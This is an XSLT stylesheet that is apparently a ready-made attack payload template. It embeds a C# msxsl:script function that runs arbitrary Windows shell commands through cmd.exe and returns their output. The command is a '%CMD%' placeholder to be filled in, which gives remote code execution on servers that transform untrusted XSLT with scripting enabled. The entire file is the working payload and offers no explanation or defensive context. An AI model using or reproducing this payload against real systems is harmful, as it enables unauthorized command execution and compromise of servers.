<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:msxsl="urn:schemas-microsoft-com:xslt"
                xmlns:user="urn:my-scripts">

    <msxsl:script language = "C#" implements-prefix = "user">
        <![CDATA[
        public string execute(string command)
        {
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo.FileName= "cmd";
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.Arguments = "/c " + command;
            proc.Start();
            return proc.StandardOutput.ReadToEnd();
        }
        ]]>
    </msxsl:script>
    
    <xsl:template match="/">
        <output>
            <value><xsl:value-of select="user:execute('%CMD%')"/></value>
        </output>
    </xsl:template>

</xsl:stylesheet>